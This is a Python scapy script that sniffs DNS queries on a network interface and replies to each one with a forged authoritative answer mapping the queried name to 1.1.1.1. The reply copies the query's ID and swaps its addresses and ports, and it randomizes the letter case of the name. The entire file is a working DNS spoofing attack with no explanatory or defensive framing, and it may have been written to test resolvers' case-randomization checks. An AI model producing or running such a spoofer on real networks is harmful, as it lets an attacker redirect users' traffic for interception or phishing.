#!/usr/bin/env python3
# Import scapy libraries
from scapy.all import *
import random
import codecs

# Set the interface to listen and respond on
net_interface = "eth0"


# Berkeley Packet Filter for sniffing specific DNS packet only
packet_filter = " and ".join([
    "udp dst port 53",          # Filter UDP port 53
    "udp[10] & 0x80 = 0"       # DNS queries only
    ])

# Function that replies to DNS query
def dns_reply(packet):

    # Construct the DNS packet
    # Construct the Ethernet header by looking at the sniffed packet
    eth = Ether(
        src=packet[Ether].dst,
        dst=packet[Ether].src
        )

    # Construct the IP header by looking at the sniffed packet
    ip = IP(
        src=packet[IP].dst,
        dst=packet[IP].src
        )

    # Construct the UDP header by looking at the sniffed packet
    udp = UDP(
        dport=packet[UDP].sport,
        sport=packet[UDP].dport
        )

    # Construct the DNS response by looking at the sniffed packet and manually

    qname = packet[DNS].qd.qname.decode('unicode_escape')
    case_random = ''.join(choice((str.upper, str.lower))(c) for c in qname)
    
    dns = DNS(
        id=packet[DNS].id,
        #qd=packet[DNS].qd,
        qd=DNSQR(qname=case_random),
        aa=1,
        rd=0,
        qr=1,
        rcode=0,
        qdcount=1,
        ancount=1,
        nscount=0,
        arcount=0,
        an=DNSRR(
            rrname=case_random,
            type='A',
            ttl=30,
            rdata='1.1.1.1')
        )
        
    # Put the full packet together
    response_packet = eth / ip / udp / dns

    # Send the DNS response
    sendp(response_packet, iface=net_interface)

# Sniff for a DNS query matching the 'packet_filter' and send a specially crafted reply
sniff(filter='udp and dst port 53', iface=net_interface, store=0, prn=dns_reply)

